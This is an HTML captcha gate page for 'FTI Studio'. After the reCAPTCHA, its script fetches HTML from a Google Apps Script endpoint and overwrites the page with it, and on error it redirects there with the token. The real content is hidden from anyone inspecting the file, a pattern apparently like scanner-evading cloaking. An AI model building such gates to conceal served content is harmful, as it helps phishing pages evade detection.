<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FTI Studio | Captcha</title>
    <link rel="icon" type="image/x-icon" href="/images/favicon.ico">
    <link rel="stylesheet" href="styles.css">
</head>
<body>
<script src="https://google.com/recaptcha/api.js" async defer></script>

<form id="myForm">
  <div class="g-recaptcha" data-sitekey="6Lf-nZ8tAAAAAK1Fqin_9Lvez8sStEEdyjD0Gp4M"></div>
  <button type="submit">Submit</button>
</form>

<script>
document.getElementById('myForm').addEventListener('submit', async (e) => {
  e.preventDefault();
  const token = grecaptcha.getResponse();
  
  if (!token) {
    alert('Please complete the reCAPTCHA');
    return;
  }
  
  const endpoint = "https://script.google.com/macros/s/AKfycbzXYeBPSlsaZPkHGecDkUZ5-8mSUCVt2z-mIkWad-CX1JFhKnCxoNA5NsnpjOCdi3ig/exec";
  
  try {
    const res = await fetch(endpoint, {
      method: 'POST',
      body: JSON.stringify({ token: token })
    });

    const data = await res.json();
    if (data.success) {
      document.open();
      document.write(data.html);
      document.close();
    } else {
      alert('Verification failed.');
      grecaptcha.reset();
    }
  } catch (err) {
    console.log("CORS blocked fetch. Running secure fallback detour...");
    window.location.href = endpoint + "?token=" + token;
  }
});
</script>

</body>
</html>
